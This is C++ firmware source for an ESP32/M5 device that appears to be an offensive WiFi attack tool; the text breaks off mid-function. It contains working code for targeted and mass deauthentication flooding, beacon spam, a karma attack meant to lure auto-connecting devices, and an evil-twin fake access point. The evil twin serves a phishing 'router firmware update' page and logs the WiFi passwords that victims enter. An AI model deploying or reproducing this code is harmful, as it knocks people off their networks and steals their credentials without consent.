

#include "wifi_menu.h"
#include "wifi_deauth.h"
#include "mitm_attack.h"
#include "ddos_menu.h"
#include "config.h"
#include "settings.h"
#include "keyboard.h"
#include "ui.h"
#include "menu.h"
#include <Arduino.h>
#include <M5Unified.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_netif.h>
#include <DNSServer.h>           
#include <ESPAsyncWebServer.h>   

static const uint8_t _default_target[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   
    0x00, 0x00,                           
    0xf0, 0xff, 0x02, 0x00                
};
static uint8_t deauth_frame[sizeof(deauth_frame_default)];

constexpr size_t BEACON_PKT_LEN = 109;
static const uint8_t beaconPacketTemplate[BEACON_PKT_LEN] = {
     0x80, 0x00, 0x00, 0x00,
     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
     0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
     0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
     0x00, 0x00,
     0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
     0xe8, 0x03,
     0x31, 0x00,
     0x00, 0x20,
     0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
                  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
                  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
                  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
     0x01, 0x08,
     0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
     0x03, 0x01,
     0x01,
     0x30, 0x18,
     0x01, 0x00,
     0x00, 0x0f, 0xac, 0x02,
     0x02, 0x00,
     0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
     0x01, 0x00,
     0x00, 0x0f, 0xac, 0x02,
     0x00, 0x00
};

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    if (arg == 31337) return 1;
    else return 0;
}

static void send_raw_frame(const uint8_t *frame_buffer, int size)
{
    esp_wifi_set_promiscuous(false);
    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    delay(1);
    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    delay(1);
    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    delay(1);
}

static void wifi_complete_cleanup()
{
    Serial.println("[WIFI_ATK] Complete WiFi cleanup");
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_stop();
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(300);
}

static const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
static uint8_t channelIndex = 0;
static uint8_t wifi_channel = 1;

static void nextChannel()
{
    const size_t nChannels = sizeof(channels) / sizeof(channels[0]);
    if (nChannels == 0) return;
    channelIndex = (channelIndex + 1) % nChannels;
    uint8_t ch = channels[channelIndex];
    if (ch >= 1 && ch <= 14) {
        wifi_channel = ch;
        esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
    }
}

static void generateRandomWiFiMac(uint8_t *mac)
{
    for (int i = 1; i < 6; i++) { mac[i] = (uint8_t)random(0, 255); }
}

static char randomName[32];
static char *randomSSID()
{
    const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int len = rand() % 22 + 7;
    for (int i = 0; i < len; ++i) { randomName[i] = charset[rand() % strlen(charset)]; }
    randomName[len] = '\0';
    return randomName;
}

static const char Beacons[] PROGMEM = {
    "Mom Use This One\n"
    "Abraham Linksys\n"
    "Benjamin FrankLAN\n"
    "Martin Router King\n"
    "John Wilkes Bluetooth\n"
    "Pretty Fly for a Wi-Fi\n"
    "Bill Wi the Science Fi\n"
    "I Believe Wi Can Fi\n"
    "Tell My Wi-Fi Love Her\n"
    "No More Mister Wi-Fi\n"
    "LAN Solo\n"
    "The LAN Before Time\n"
    "Silence of the LANs\n"
    "House LANister\n"
    "Winternet Is Coming\n"
    "Ping's Landing\n"
    "The Ping in the North\n"
    "This LAN Is My LAN\n"
    "Get Off My LAN\n"
    "The Promised LAN\n"
    "The LAN Down Under\n"
    "FBI Surveillance Van 4\n"
    "Area 51 Test Site\n"
    "Drive-By Wi-Fi\n"
    "Planet Express\n"
    "Wu Tang LAN\n"
    "Darude LANstorm\n"
    "Never Gonna Give You Up\n"
    "Hide Yo Kids, Hide Yo Wi-Fi\n"
    "Loading...\n"
    "Searching...\n"
    "VIRUS.EXE\n"
    "Virus-Infected Wi-Fi\n"
    "Starbucks Wi-Fi\n"
    "Text 64ALL for Password\n"
    "Yell KITEN for Password\n"
    "The Password Is 1234\n"
    "Free Public Wi-Fi\n"
    "No Free Wi-Fi Here\n"
    "Get Your Own Damn Wi-Fi\n"
    "It Hurts When IP\n"
    "Dora the Internet Explorer\n"
    "404 Wi-Fi Unavailable\n"
    "Porque-Fi\n"
    "Titanic Syncing\n"
    "Test Wi-Fi Please Ignore\n"
    "Drop It Like It's Hotspot\n"
    "Life in the Fast LAN\n"
    "The Creep Next Door\n"
    "Ye Olde Internet\n"
};

static const char rickrollssids[] PROGMEM = {
    "01 Never gonna give you up\n"
    "02 Never gonna let you down\n"
    "03 Never gonna run around\n"
    "04 and desert you\n"
    "05 Never gonna make you cry\n"
    "06 Never gonna say goodbye\n"
    "07 Never gonna tell a lie\n"
    "08 and hurt you\n"
};

static void prepareBeaconPacket(uint8_t *outPacket, const uint8_t *macAddr,
                                const char *ssid, uint8_t ssidLen, uint8_t channel,
                                bool wpa)
{
    memcpy(outPacket, beaconPacketTemplate, BEACON_PKT_LEN);
    memcpy(&outPacket[10], macAddr, 6);
    memcpy(&outPacket[16], macAddr, 6);
    memset(&outPacket[38], 0x20, 32);   
    if (ssidLen > 32) ssidLen = 32;
    if (ssidLen > 0) { memcpy(&outPacket[38], ssid, ssidLen); }
    outPacket[37] = ssidLen;
    outPacket[82] = channel;
    if (wpa) outPacket[34] = 0x31;
}

static void beaconSpamList(const char *list)
{
    uint8_t beaconPacket[BEACON_PKT_LEN];
    uint8_t macAddr[6] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06};
    int i = 0;
    int ssidsLen = strlen(list);

    nextChannel();

    while (i < ssidsLen) {
        char ssidBuf[33];
        memset(ssidBuf, 0, sizeof(ssidBuf));
        int j = 0;
        char tmp;
        do {
            tmp = list[i + j];
            if (j < 32 && tmp != '\n') ssidBuf[j] = tmp;
            j++;
        } while (tmp != '\n' && i + j < ssidsLen);

        uint8_t ssidLen = (j > 32) ? 32 : (uint8_t)(j - 1);

        generateRandomWiFiMac(macAddr);
        prepareBeaconPacket(beaconPacket, macAddr, ssidBuf, ssidLen, wifi_channel, true);

        
        for (int k = 0; k < 2; k++) {
            esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, BEACON_PKT_LEN, false);
            delay(1);
        }

        i += j;
        
        M5.update();
        pollKeyboard();
        if (check(EscPress)) break;
    }
}

static void beaconSpamSingle(const String &baseSSID)
{
    uint8_t beaconPacket[BEACON_PKT_LEN];
    uint8_t macAddr[6] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06};
    int counter = 1;

    nextChannel();

    for (;;) {
        String currentSSID = baseSSID + String(counter);
        if (currentSSID.length() > 32) { currentSSID = currentSSID.substring(0, 32); }
        uint8_t ssidLen = (uint8_t)currentSSID.length();

        generateRandomWiFiMac(macAddr);
        prepareBeaconPacket(beaconPacket, macAddr, currentSSID.c_str(), ssidLen, wifi_channel, true);

        for (int k = 0; k < 2; k++) {
            esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, BEACON_PKT_LEN, false);
            delay(1);
        }

        counter++;
        if (counter > 9999) {
            counter = 1;
            nextChannel();
        }
        M5.update();
        pollKeyboard();
        if (check(EscPress)) break;
    }
}

static void prepareDeauthFrame(const uint8_t *apBssid, const uint8_t *target = _default_target)
{
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[4], target, 6);   
    memcpy(&deauth_frame[10], apBssid, 6); 
    memcpy(&deauth_frame[16], apBssid, 6); 
}

static bool wifi_atk_setWifi()
{
    Serial.println("[WIFI_ATK] Setting up WiFi for attack mode...");
    
    
    WiFi.softAPdisconnect(true);
    delay(50);
    
    
    if (WiFi.status() == WL_CONNECTED) {
        WiFi.disconnect(true, true);
        delay(50);
    }
    
    
    wifi_mode_t currentMode = WiFi.getMode();
    if (currentMode != WIFI_MODE_APSTA) {
        Serial.println("[WIFI_ATK] Switching to APSTA mode (current: " + String(currentMode) + ")");
        if (!WiFi.mode(WIFI_MODE_APSTA)) {
            Serial.println("[WIFI_ATK] ERROR: Failed to set APSTA mode!");
            displayError("Failed starting\nWIFI APSTA mode", true);
            return false;
        }
        delay(200);  
    }
    
    
    uint8_t randomChannel = (uint8_t)random(1, 12);
    Serial.println("[WIFI_ATK] Starting KITENAttack AP on channel " + String(randomChannel));
    
    bool apResult = WiFi.softAP("KITENAttack", "", randomChannel, 1, 4, false);
    if (!apResult) {
        Serial.println("[WIFI_ATK] ERROR: Failed to start softAP!");
        displayError("Failed to start\nAttack AP", true);
        return false;
    }
    delay(100);
    
    
    currentMode = WiFi.getMode();
    String apSSID = WiFi.softAPSSID();
    Serial.println("[WIFI_ATK] Ready! Mode=" + String(currentMode) + " AP=" + apSSID + " Ch=" + String(randomChannel));
    
    return true;
}

static bool wifi_atk_unsetWifi()
{
    if (String(WiFi.softAPSSID()) == "KITENAttack") {
        WiFi.softAPdisconnect();
        delay(100);
    }
    if (WiFi.status() != WL_CONNECTED) {
        wifiDisconnect();
    }
    return true;
}

static void wifi_atk_info(const String &tssid, const String &mac, uint8_t channel)
{
    drawMainBorder(true);
    M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
    M5.Display.setTextSize(FP);
    M5.Display.setTextDatum(top_left);
    M5.Display.setCursor(4, 30);
    M5.Display.println("-=Information=-");
    M5.Display.println("AP: " + tssid);
    M5.Display.println("Channel: " + String(channel));
    M5.Display.println("BSSID: " + mac);
    M5.Display.println();
    M5.Display.println("Enter: act   Back: exit");

    waitAllKeysReleased();
    for (;;) {
        M5.update();
        pollKeyboard();
        if (check(SelPress) || check(EscPress)) {
            waitAllKeysReleased();
            return;
        }
        delay(20);
    }
}

void targetAtk(const String &tssid, const String &mac, uint8_t channel)
{
    Serial.println("[TARGET_ATK] Starting attack on: " + tssid + " (" + mac + ") ch=" + String(channel));
    
    
    if (!wifi_atk_setWifi()) {
        Serial.println("[TARGET_ATK] ERROR: wifi_atk_setWifi failed!");
        displayError("Failed to setup\nWiFi for attack", true);
        return;
    }

    
    uint8_t bssid[6];
    int parsed = sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
    
    if (parsed != 6) {
        Serial.println("[TARGET_ATK] ERROR: Invalid BSSID format: " + mac);
        displayError("Invalid BSSID format", true);
        return;
    }
    
    Serial.printf("[TARGET_ATK] Parsed BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
                  bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);

    
    prepareDeauthFrame(bssid);
    esp_err_t chResult = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (chResult != ESP_OK) {
        Serial.println("[TARGET_ATK] WARNING: Failed to set channel, error=" + String(chResult));
    } else {
        Serial.println("[TARGET_ATK] Channel set to " + String(channel));
    }

    
    drawMainBorder(true);
    M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
    M5.Display.setTextSize(FP);
    M5.Display.setTextDatum(top_left);
    M5.Display.setCursor(4, 28);
    M5.Display.println("== TARGET DEAUTH ==");
    M5.Display.println("");
    M5.Display.println("AP: " + tssid);
    M5.Display.println("BSSID: " + mac);
    M5.Display.println("Channel: " + String(channel));
    M5.Display.println("");
    M5.Display.println("Sending deauth...");
    M5.Display.println("");
    M5.Display.println("ENTER: pause/resume");
    M5.Display.println("BACK: stop attack");

    waitAllKeysReleased();
    uint32_t lastUpdate = millis();
    uint32_t frameCount = 0;
    bool attackActive = true;

    while (attackActive) {
        send_raw_frame(deauth_frame, sizeof(deauth_frame));
        frameCount += 3;   

        uint32_t now = millis();
        if (now - lastUpdate >= 2000) {
            M5.Display.fillRect(4, SCREEN_HEIGHT - 20, SCREEN_WIDTH - 8, 14, kitenConfig.bgColor);
            M5.Display.setCursor(4, SCREEN_HEIGHT - 20);
            float fps = (frameCount * 1000.0) / (now - lastUpdate);
            M5.Display.print("Frames: " + String((int)fps) + "/s   ");
            frameCount = 0;
            lastUpdate = now;
        }

        M5.update();
        pollKeyboard();
        if (check(SelPress)) {
            
            waitAllKeysReleased();
            displayInfo("Deauth Paused", false);
            for (;;) {
                M5.update();
                pollKeyboard();
                if (check(SelPress)) { waitAllKeysReleased(); break; }
                if (check(EscPress)) { attackActive = false; waitAllKeysReleased(); break; }
                delay(10);
            }
            if (attackActive) {
                lastUpdate = millis();
                frameCount = 0;
            }
        }
        if (check(EscPress)) {
            waitAllKeysReleased();
            break;
        }
    }

    wifi_atk_unsetWifi();
}

void captureHandshake(const String &tssid, const String &mac, uint8_t channel)
{
    (void)tssid; (void)mac; (void)channel;
    
    std::vector<Option> opts = {
        {"Learn More", []() {
            displayInfo(
                "=== Handshake Capture ===\n\n"
                "Captures WPA2 4-way handshake\n"
                "for offline password cracking.\n\n"
                "REQUIRES:\n"
                "- Full promiscuous sniffer\n"
                "- EAPOL packet parser (~1300 LOC)\n"
                "- SD card for .pcap output\n\n"
                "ALTERNATIVE:\n"
                "Use 'Deauth+Clone' attack!\n"
                "It captures passwords directly\n"
                "from the captive portal.\n",
                true
            );
        }},
        {"Try Deauth+Clone", []() {
            displayInfo(
                "Use: Target Atks >\n"
                "Deauth+Clone instead!\n\n"
                "It's easier and captures\n"
                "passwords directly.\n",
                true
            );
        }},
        {"Back", [](){}},
    };
    loopOptions(opts, MENU_TYPE_SUBMENU, "Handshake Capture");
}

static const char* karma_ssids[] = {
    "Home",
    "HOME",
    "HomeNetwork",
    "Home Network",
    "WiFi",
    "WIFI",
    "WiFi_Home",
    "MyWiFi",
    "My WiFi",
    "Internet",
    "Fritz!Box",
    "FRITZ!Box",
    "Telekom",
    "Vodafone",
    "o2-WLAN",
    "WLAN",
    "NETGEAR",
    "TP-Link",
    "ASUS",
    "D-Link",
    "Linksys",
    "Arris",
    "Comcast",
    "Xfinity",
    "Spectrum",
    "ATT",
    "Verizon",
    "Virgin Media",
    "BT-Hub",
    "Bbox",
    "Livebox",
    "Freebox",
    "Fastweb",
    "TIM-WiFi",
    "Tele2",
    "Telenor",
    "Telia",
    "Swisscom",
    "Sunrise",
    "KPN",
    "Proximus",
    "Mobile",
    "Mobile Hotspot",
    "iPhone",
    "AndroidAP",
    "Samsung",
    "Xiaomi",
    "Huawei",
    "Redmi Note",
    "Galaxy",
    "Pixel",
    "Office",
    "Office WiFi",
    "Guest",
    "Guest WiFi",
    "Public WiFi",
    "Free WiFi",
    "Starbucks",
    "McDonalds",
    "McDonald's Free Wi-Fi",
    "Airport WiFi",
    "Hotel WiFi",
    "Cafe WiFi",
    NULL  
};

static volatile bool karma_running = false;
static int karma_victim_count = 0;
static unsigned long karma_start_time = 0;

void karmaSetup()
{
    if (!wifi_atk_setWifi()) return;
    
    
    drawMainBorder(true);
    M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
    M5.Display.setTextSize(FP);
    M5.Display.setTextDatum(top_left);
    M5.Display.setCursor(4, 28);
    M5.Display.println("= KARMA ATTACK =");
    M5.Display.println("");
    M5.Display.println("Broadcasting popular SSIDs");
    M5.Display.println("to lure auto-connecting");
    M5.Display.println("devices...");
    M5.Display.println("");
    M5.Display.println("Press BACK to stop");
    
    karma_running = true;
    karma_victim_count = 0;
    karma_start_time = millis();
    
    uint8_t beaconPacket[BEACON_PKT_LEN];
    uint8_t macAddr[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x00};  
    
    waitAllKeysReleased();
    
    uint32_t lastChannelChange = millis();
    uint32_t lastStatsUpdate = millis();
    int ssid_index = 0;
    int packets_sent = 0;
    
    while (karma_running) {
        
        int total_ssids = 0;
        while (karma_ssids[total_ssids] != NULL) total_ssids++;
        
        
        const char* current_ssid = karma_ssids[ssid_index];
        uint8_t ssid_len = strlen(current_ssid);
        if (ssid_len > 32) ssid_len = 32;
        
        
        macAddr[1] = (ssid_index >> 8) & 0xFF;
        macAddr[2] = ssid_index & 0xFF;
        macAddr[3] = wifi_channel;
        macAddr[4] = random(0, 256);
        macAddr[5] = random(0, 256);
        
        prepareBeaconPacket(beaconPacket, macAddr, current_ssid, ssid_len, wifi_channel, true);
        
        
        for (int k = 0; k < 3; k++) {
            esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, BEACON_PKT_LEN, false);
            delay(1);
            packets_sent++;
        }
        
        ssid_index++;
        if (karma_ssids[ssid_index] == NULL) {
            ssid_index = 0;
            
            nextChannel();
        }
        
        
        uint32_t now = millis();
        if (now - lastStatsUpdate >= 500) {
            lastStatsUpdate = now;
            unsigned long elapsed = (now - karma_start_time) / 1000;
            float rate = packets_sent / ((now - karma_start_time) / 1000.0);
            
            M5.Display.fillRect(4, SCREEN_HEIGHT - 24, SCREEN_WIDTH - 8, 20, kitenConfig.bgColor);
            M5.Display.setCursor(4, SCREEN_HEIGHT - 24);
            M5.Display.print("Ch:" + String(wifi_channel) + " Pkt:" + String(packets_sent) + " " + String(rate,0) + "/s");
            M5.Display.setCursor(4, SCREEN_HEIGHT - 12);
            M5.Display.print("Time: " + String(elapsed) + "s   SSIDs: " + String(total_ssids));
        }
        
        
        M5.update();
        pollKeyboard();
        if (check(EscPress)) {
            karma_running = false;
            uiBeep(440, 30);
            waitAllKeysReleased();
        }
        
        delay(2);  
    }
    
    wifi_atk_unsetWifi();
    
    unsigned long total_time = (millis() - karma_start_time) / 1000;
    displayInfo(
        String("Karma Attack Stopped\n\n") +
        "Duration: " + String(total_time) + "s\n" +
        "Packets sent: " + String(packets_sent) + "\n\n" +
        "Devices may have connected\n" +
        "to our fake APs.",
        true
    );
}

void beaconAttack()
{
    if (!wifi_atk_setWifi()) return;

    int beaconMode = -1;
    String txt;
    String singleSSID;

    std::vector<Option> modeOpts = {
        {"Funny SSID",   [&]() { beaconMode = 0; txt = "Spamming Funny";   }},
        {"Ricky Roll",   [&]() { beaconMode = 1; txt = "Spamming Ricky";   }},
        {"Random SSID",  [&]() { beaconMode = 2; txt = "Spamming Random";  }},
        {"Single SSID",  [&]() { beaconMode = 4; txt = "Spamming Single";  }},
        {"Custom SSIDs", [&]() { beaconMode = 3; txt = "Spamming Custom";  }},
        {"Back",         [&]() { beaconMode = -1; }},
    };
    loopOptions(modeOpts, MENU_TYPE_SUBMENU, "Beacon SPAM");
    if (beaconMode == -1) {
        wifi_atk_unsetWifi();
        return;
    }

    
    if (beaconMode == 4) {
        singleSSID = keyboard("KITENBeacon", 26, "Base SSID:");
        if (singleSSID.length() == 0 || singleSSID == "\x1B") {
            wifi_atk_unsetWifi();
            return;
        }
    }

    
    String customList;
    if (beaconMode == 3) {
        String input = keyboard("", 200, "SSIDs (use | for newline):");
        if (input == "\x1B") { wifi_atk_unsetWifi(); return; }
        
        customList = input;
        customList.replace("|", "\n");
        
        if (!customList.endsWith("\n")) customList += "\n";
    }

    
    drawMainBorder(true);
    M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
    M5.Display.setTextSize(FP);
    M5.Display.setTextDatum(top_left);
    M5.Display.setCursor(4, 30);
    M5.Display.println("WiFi: Beacon SPAM");
    M5.Display.println(txt);
    M5.Display.println();
    M5.Display.println("Press Back to stop.");

    waitAllKeysReleased();
    for (;;) {
        if (beaconMode == 0)      beaconSpamList(Beacons);
        else if (beaconMode == 1) beaconSpamList(rickrollssids);
        else if (beaconMode == 2) { char *r = randomSSID(); beaconSpamList(r); }
        else if (beaconMode == 4) beaconSpamSingle(singleSSID);
        else if (beaconMode == 3) beaconSpamList(customList.c_str());

        M5.update();
        pollKeyboard();
        if (check(EscPress)) { waitAllKeysReleased(); break; }
    }

    wifi_atk_unsetWifi();
    displayInfo("Beacon spam stopped.", true);
}

void deauthFloodAttack()
{
    if (!wifi_atk_setWifi()) return;

    
    bool needRescan = true;

    std::vector<std::pair<std::vector<uint8_t>, uint8_t>> targets;

    uint32_t lastTime = millis();
    uint32_t rescanCounter = millis();
    uint32_t frameCount = 0;
    uint8_t currentChannel = 0;

    waitAllKeysReleased();
    for (;;) {
        if (needRescan) {
            displayInfo("Scanning..", false);
            int nets = WiFi.scanNetworks(false, showHiddenNetworks);
            targets.clear();
            for (int i = 0; i < nets; i++) {
                std::vector<uint8_t> bssid(6);
                memcpy(bssid.data(), WiFi.BSSID(i), 6);
                uint8_t ch = (uint8_t)WiFi.channel(i);
                targets.push_back({bssid, ch});
            }
            WiFi.scanDelete();
            needRescan = false;
            rescanCounter = millis();

            
            drawMainBorder(true);
            M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
            M5.Display.setTextSize(FP);
            M5.Display.setTextDatum(top_left);
            M5.Display.setCursor(4, 30);
            M5.Display.println("Deauth Flood");
            M5.Display.println("Targets: " + String(targets.size()) + " APs");
            M5.Display.println();
            M5.Display.println("Press Back to stop.");
        }

        
        for (auto &t : targets) {
            esp_wifi_set_channel(t.second, WIFI_SECOND_CHAN_NONE);
            currentChannel = t.second;
            prepareDeauthFrame(t.first.data());
            for (int i = 0; i < 100; i++) {
                send_raw_frame(deauth_frame, sizeof(deauth_frame));
                frameCount += 3;
                M5.update();
                pollKeyboard();
                if (check(EscPress)) goto stop_attack;
            }
        }

        
        uint32_t now = millis();
        if (now - lastTime > 2000) {
            M5.Display.fillRect(4, SCREEN_HEIGHT - 20, SCREEN_WIDTH - 8, 14, kitenConfig.bgColor);
            M5.Display.setCursor(4, SCREEN_HEIGHT - 20);
            M5.Display.print("Frames: " + String(frameCount / 2) + "/s   ch." + String(currentChannel) + "   ");
            frameCount = 0;
            lastTime = now;
        }

        
        if (now - rescanCounter > 60000) {
            needRescan = true;
        }

        M5.update();
        pollKeyboard();
        if (check(EscPress)) break;
    }

stop_attack:
    wifi_atk_unsetWifi();
    displayInfo("Deauth flood stopped.", true);
}

void targetAtkMenu(const String &tssid, const String &mac, uint8_t channel)
{
    for (;;) {
        std::vector<Option> opts = {
            {"Information",         [=]() { wifi_atk_info(tssid, mac, channel); }},
            {"Deauth",              [=]() { targetAtk(tssid, mac, channel); }},
            {"Capture Handshake",   [=]() { captureHandshake(tssid, mac, channel); }},
            {"Clone Portal",        [=]() { clonePortalOnly(tssid, mac, channel); }},
            {"Deauth+Clone",        [=]() { deauthCloneAttack(tssid, mac, channel, false); }},
            {"Deauth+Clone+Verify", [=]() { deauthCloneAttack(tssid, mac, channel, true);  }},
            {"Back",                [](){}},
        };
        int sel = loopOptions(opts, MENU_TYPE_SUBMENU, "Target Atks");
        if (sel == -1 || sel == (int)opts.size() - 1) return;
    }
}

void clonePortalOnly(const String &tssid, const String &mac, uint8_t channel)
{
    Serial.println("[CLONE_PORTAL] Starting Clone Portal for: " + tssid);
    
    
    evilPortal(tssid, channel, false, false);
}

void deauthCloneAttack(const String &tssid, const String &mac, uint8_t channel, bool verifyMode)
{
    Serial.println("[DEAUTH_CLONE] Starting combined attack on: " + tssid);
    Serial.println("[DEAUTH_CLONE] BSSID: " + mac + " Channel: " + String(channel));
    Serial.println("[DEAUTH_CLONE] Verify Mode: " + String(verifyMode ? "ON" : "OFF"));
    
    
    uint8_t targetBSSID[6];
    int parsed = sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &targetBSSID[0], &targetBSSID[1], &targetBSSID[2],
           &targetBSSID[3], &targetBSSID[4], &targetBSSID[5]);
    
    if (parsed != 6) {
        displayError("Invalid BSSID format\\nCannot proceed", true);
        return;
    }
    
    
    
    
    Serial.println("[DEAUTH_CLONE] Step 1: Setting up WiFi...");
    
    
    WiFi.softAPdisconnect(true);
    delay(50);
    if (WiFi.status() == WL_CONNECTED) {
        WiFi.disconnect(true, true);
        delay(50);
    }
    
    
    if (!WiFi.mode(WIFI_AP)) {
        displayError("Failed to set\\nAP mode!", true);
        return;
    }
    delay(100);
    
    
    
    
    Serial.println("[DEAUTH_CLONE] Step 2: Creating fake AP with SSID: " + tssid);
    
    IPAddress gateway(172, 0, 0, 1);
    WiFi.softAPConfig(gateway, gateway, IPAddress(255, 255, 255, 0));
    
    
    
    bool apOk = WiFi.softAP(tssid.c_str(), "", channel, 1, 4, false);
    if (!apOk) {
        displayError("Failed to create\\nfake AP!", true);
        return;
    }
    delay(200);
    
    String ourIP = WiFi.softAPIP().toString();
    Serial.println("[DEAUTH_CLONE] Fake AP started! IP: " + ourIP + " Ch: " + String(channel));
    
    
    
    
    Serial.println("[DEAUTH_CLONE] Step 3: Starting DNS server...");
    
    DNSServer dnsServer;
    dnsServer.start(53, "*", WiFi.softAPIP());
    
    
    
    
    Serial.println("[DEAUTH_CLONE] Step 4: Starting WebServer...");
    
    AsyncWebServer server(80);
    
    
    const char* portalHtml = R"rawliteral(
<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Router Update</title>
<style>body{font-family:Arial,sans-serif;background:#d3d3d3;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.container{background:white;padding:25px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.2);text-align:center;max-width:360px;width:100%}
h1{color:#333;font-size:20px;margin-bottom:12px}p{color:#666;font-size:14px;margin-bottom:18px}
input[type=password]{width:100%;padding:12px;margin:10px 0;border-radius:5px;border:1px solid #ccc;font-size:16px;box-sizing:border-box}
button{width:100%;padding:12px;background-color:#007bff;color:white;border:none;border-radius:5px;cursor:pointer;font-size:16px}</style></head><body>
<div class='container'>
<h1>Firmware Update Required</h1>
<p>Your router needs an update. Please enter your Wi-Fi password to continue.</p>
<form action='/capture' method='post'>
<input type='password' name='password' placeholder='Wi-Fi Password' required>
<button type='submit'>Update Now</button></form></div></body></html>
)rawliteral";
    
    const char* successHtml = R"rawliteral(
<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Success</title>
<style>body{font-family:Arial;text-align:center;padding:40px;background:#f8f9fa}
.box{background:white;max-width:400px;margin:auto;padding:30px;border-radius:8px}
.ok{color:#34a853;font-size:48px}h1{color:#202124}p{color:#5f6368}</style></head><body>
<div class='box'><div class='ok'>&#10004;</div><h1>Update Complete!</h1><p>Your router has been updated successfully.</p></div></body></html>
)rawliteral";
    
    int capturedCount = 0;
    String lastCred = "";
    
    
    server.on("/", HTTP_GET, [portalHtml](AsyncWebServerRequest *request) {
        request->send(200, "text/html", portalHtml);
    });
    
    
    server.on("/capture", HTTP_POST, [&capturedCount, &lastCred, successHtml](AsyncWebServerRequest *request) {
        if (request->hasArg("password")) {
            String pwd = request->arg("password");
            lastCred = "Password: " + pwd;
            capturedCount++;
            
            
            Serial.println("[DEAUTH_CLONE] *** CREDENTIAL CAPTURED! ***");
            Serial.println("[DEAUTH_CLONE] " + lastCred);
        }
        request->send(200, "text/html", successHtml);
    });
    
    
    server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *r) {
        r->redirect(String("http://") + r->client()->remoteIP().toString() + String("/"));
    });
    server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *r) {
        r->redirect(String("http://") + r->client()->remoteIP().toString() + String("/"));
    });
    server.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *r) {
        r->redirect(String("http://") + r->client()->remoteIP().toString() + String("/"));
    });
    server.onNotFound([&portalHtml](AsyncWebServerRequest *r) {
        r->send(200, "text/html", portalHtml);
    });
    
    server.begin();
    Serial.println("[DEAUTH_CLONE] WebServer started!");
    
    
    
    
    prepareDeauthFrame(targetBSSID);
    
    
    
    
    Serial.println("[DEAUTH_CLONE] Step 6: Starting main attack loop...");
    
    drawMainBorder(true);
    M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
    M5.Display.setTextSize(FP);
    M5.Display.setTextDatum(top_left);
    M5.Display.setCursor(4, 26);
    M5.Display.println("== DEAUTH + CLONE ==");
    M5.Display.println("");
    M5.Display.println("Target: " + tssid);
    M5.Display.println("Ch: " + String(channel) + " | IP: " + ourIP);
    M5.Display.println("");
    M5.Display.println("Status: ACTIVE");
    M5.Display.println("Creds: " + String(capturedCount));
    
    waitAllKeysReleased();
    
    unsigned long lastStatsUpdate = millis();
    unsigned long startTime = millis();
    unsigned long totalDeauths = 0;
    bool deauthPaused = false;
    bool shouldExit = false;
    
    while (!shouldExit) {
        
        dnsServer.processNextRequest();
        
        
        if (!deauthPaused) {
            
            for (int i = 0; i < 5; i++) {
                esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
                send_raw_frame(deauth_frame, sizeof(deauth_frame));
                totalDeauths += 3;  
            }
        }
        
        
        unsigned long now = millis();
        if (now - lastStatsUpdate >= 500) {
            lastStatsUpdate = now;
            unsigned long elapsed = (now - startTime) / 1000;
            float deauthRate = totalDeauths / ((now - startTime) / 1000.0);
            
